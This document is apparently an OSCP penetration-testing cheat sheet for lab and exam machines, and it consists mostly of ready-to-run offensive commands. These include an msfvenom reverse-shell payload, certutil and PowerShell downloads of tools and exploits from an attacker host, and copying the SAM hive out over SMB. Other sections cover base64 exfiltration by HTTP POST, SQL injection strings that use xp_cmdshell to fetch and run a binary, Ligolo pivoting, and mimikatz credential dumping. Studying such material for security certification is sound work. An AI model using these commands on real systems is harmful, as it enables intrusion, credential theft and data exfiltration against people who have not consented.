# OSCP cheat sheet

# Other resources to consult

[Daniel-Ayz](https://github.com/Daniel-Ayz/OSCP)

[xsudoxx](https://github.com/xsudoxx/OSCP)

[0xsyr0](https://github.com/0xsyr0/OSCP)

## autorecon

```jsx
sudo autorecon 192.168.193.153
```

```jsx
sudo autorecon targets.txt
```

## FTP

<aside>
Login to ftp, login:pass to enter in prompt
</aside>

```jsx
ftp 192.168.202.149
```

<aside>
Download all FTP connected locally
</aside>

```jsx
wget -m ftp://anonymous:anonymous@192.168.216.157
```

## msfvenom

<aside>
Use https://www.revshells.com/#msfvenom to select the right shell type
</aside>

```jsx
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.231.122 LPORT=80
```

## File Transfers

<aside>
Also other techniques exits, like using FTP and SMB shares by simply by uploading & downloading the files.
</aside>

### From attacker (kali) → Victim

#### Python webserver

<aside>
Start python webserver on Kali
</aside>

```jsx
python -m http.server 8080
```

<aside>
Run on victims file system
</aside>

```jsx
wget http://192.168.45.212:8080/exploit.py
curl http://192.168.45.213:8080/exploit.ps1
```

<aside>
Windows specific
</aside>

```jsx
certutil -split -urlcache -f http://192.168.45.217:8080/nc64.exe c:\Users\Administrator\Documents\nc64.exe
powershell iwr -uri http://192.168.45.237:8080/sql.exe -OutFile C:/Users/Public/sql.exe
Invoke-WebRequest -Uri http://10.10.93.141:8080/winPEASx64.exe -OutFile wp.exe
```

#### SMB

```jsx
impacket-smbserver data . -smb2support
net use \\<kali-ip>\data
copy local.txt \\<kali-ip>\\data\local.txt
```

### From victim → attacker (Kali)

#### SMB

<aside>
Copy the file to diretory to transfer
</aside>

```jsx
copy C:\windows.old\Windows\System32\SAM C:\users\Public\SAM
```

<aside>
Give public access folder (if not done yet)
</aside>

```jsx
icacls "c:\users\public" /grant "Everyone:(F)" /T
net share sam='c:\users\public' /grant:Everyone,FULL
```

<aside>
Log in to SMB
</aside>

```jsx
smbclient //10.10.112.154/sam -U 'oscp.exam/user%pass'
```

<aside>
Download context from SMB
</aside>

```jsx
get <filename>
```

#### SCP

```jsx
scp f.frizzle@10.10.11.60:C:\Users\f.frizzle\re2.7z /home/kali/oscp/TheFrizz
```

#### Apache

<aside>
Start Apache webserver on victims machine
</aside>

```jsx
service apache2 start
```

```jsx
wget http://192.168.45.212:8080/exploit.py
curl http://192.168.45.213:8080/exploit.ps1
```

#### NC

```jsx
nc -l -p 4443 > file.b64
nc 192.168.45.213 4443 < file.b64

```
#### Powershell (in the body)

<aside>
Send encoded file conted in base64 in the body of a request
</aside>

```jsx
Invoke-WebRequest -Uri http://10.10.14.163:4444 -Method POST -DisableKeepAlive -Timeout 10 -Body $b64;
```

<aside>
Retrieve data on Kali
</aside>

```jsx
cat file.b64 | sed -n '8,$'p | base64 -d > file.txt
```

## Interactive shell

```jsx
/bin/sh -i
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

## BloodHound

```jsx
python bloodhound.py -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -ns 192.168.119.122 -c All
bloodhound-python -u Fiona.Clarck -p Summer2023 -d nagoya-industries.com -v --zip -c All -dc nagoya-industries.com -ns 192.168.119.122
```

## LDAP

```jsx
ldapsearch -x -v -H "ldap://192.168.231.122" -D 'CN=Configuration,DC=hutch,DC=offsec' -W -b 'DC=hutch,DC=offsec' >ldapsearch.txt
ldapsearch -v -x -b "DC=hokkaido-aerospace,DC=com" -H "ldap://$ip" "(objectclass=*)"
nmap -n -sV --script "ldap* and not brute" 192.168.231.122
```

## Kerberos

```jsx
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=<USERNAME>.ccache
```

## xp_cmdshell 

```jsx
enable_xp_cmdshell
xp_cmdshell whoami
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

' UNION SELECT NULL,NULL;EXEC xp_cmdshell 'certutil -split -urlcache -f http://192.168.45.217:8000/agent.exe c:\windows\temp\agent.exe';--
' UNION SELECT NULL,NULL;EXEC xp_cmdshell 'c:\windows\temp\rp.exe'--
```

## Ligolo

<aside>
On Kali
</aside>

```jsx
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8888
```

<aside>
On Windows (after the agent.exe file is transfered)
</aside>

```jsx
.\agent.exe -connect 192.168.45.188:8888 -ignore-cert
```

<aside>
On Kali
</aside>

```jsx
session and select session with enter-key
autoroute
```

<aside>
if problems with autoroute
</aside>

```jsx
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.161.0/24 dev ligolo
```
### NMAP (with ligolo)

<aside>
Run fast nmap over list of targets:
</aside>

```jsx
sudo nmap -Pn -iL targets.txt

```

<aside>
Run slow nmap over list of targets:
</aside>

```jsx
 sudo nmap -Pn -sC -sV -iL targets.txt
```

## Users & groups (Windows)
```jsx
whoami
whoami /priv
whoami /groups
net user
net user /domain
Get-LocalUser
net user steve
Get-LocalUser steve
net group
net group /domain
Get-LocalGroup
Get-LocalGroupMember Administrators
net localgroup administrators
```

## hashcat

```jsx
hashcat -m 1000 roothash.txt /usr/share/wordlists/rockyou.txt 
```

```jsx
1000 for NTLM
1800 for SHA-512crypt
18200 for asreproasting
13100 for kerberoasting 
```

## connect to local SQL server on Windows

```jsx
.\mysql.exe -u root -h localhost -e "show databases;"
.\mysql.exe -u root -h localhost -e "use creds; show tables;select * from creds;"
```

## mimikatz

```jsx
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::msv" "lsadump::sam" "exit"
```

## ssh

<aside>
Giving the right accesses to  id_rsa 
</aside>

```jsx
chmod 600 id_rsa
```

```jsx
ssh -i 'id_rsa' john@192.168.202.149
```













## Misc

<aside>
Convert file to base64 variable (Powershell)
</aside>

```jsx
$b64 = [System.convert]::ToBase64String((Get-Content -Path '.\$RE2XMEG.7z' -Encoding Byte));
```

<aside>
Show hidden dirs in windows (Powershell)
</aside>

```jsx
Get-ChildItem . -Force
```

<aside>
Print time of the host
</aside>

```jsx
sudo rdate -n 10.10.11.60
```

<aside>
Git dump from web
</aside>

```jsx
./gitdumper.sh http://bullybox.local/.git/ .
git show ccf7c701c4bd22484cbe5d9f8f92511261aadef0:bb-config.php
```

<aside>
Get file info on windows
</aside>

```jsx
<filename> qc
```
